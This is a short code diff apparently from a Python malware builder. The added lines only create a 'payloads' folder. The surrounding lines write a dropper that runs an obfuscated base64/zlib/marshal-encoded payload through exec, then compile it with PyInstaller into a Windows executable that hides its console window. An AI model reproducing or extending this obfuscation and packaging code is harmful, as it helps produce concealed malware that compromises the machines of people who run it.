@@ -174,6 +174,9 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         with open(f"{payload_file_name}.py", 'w') as f:
             f.writelines(dropper)
 
+        if not os.path.isdir('payloads'):
+            os.makedirs('payloads')
+
 
         if os_name == "Windows":
             result = subprocess.run(f'docker run --volume "$(pwd):/src/" batonogov/pyinstaller-windows:latest "pyinstaller -F --hide-console hide-early {payload_file_name}.py"', shell=True, capture_output=True)
